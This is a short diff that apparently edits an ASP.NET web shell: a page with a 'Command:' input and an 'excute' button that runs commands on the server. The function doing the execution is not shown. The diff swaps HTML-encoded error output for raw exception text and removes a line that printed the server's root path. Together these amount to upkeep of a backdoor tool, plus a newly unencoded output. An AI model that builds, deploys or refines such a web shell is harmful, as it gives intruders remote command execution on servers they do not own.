@@ -24,7 +24,8 @@ string AA(string argA, string argB)
 	}
 	catch (Exception ex)
 	{
-		Response.Write(Server.HtmlEncode(ex));
+		Response.Write(ex);
+		return "\nFAILED";
 	}
 }
 //Data info
@@ -49,7 +50,6 @@ void YY(object sender, System.EventArgs e)
 			<asp:Button id="CC" runat="server" Text="excute" OnClick="YY"></asp:Button>
 			<asp:Label id="BB"  runat="server">Command:</asp:Label>
 		</form>
-		<script Language="c#" runat="server">  Response.Write(HttpContext.Current.Server.MapPath("~"));  </script>
 
 
 	</body>
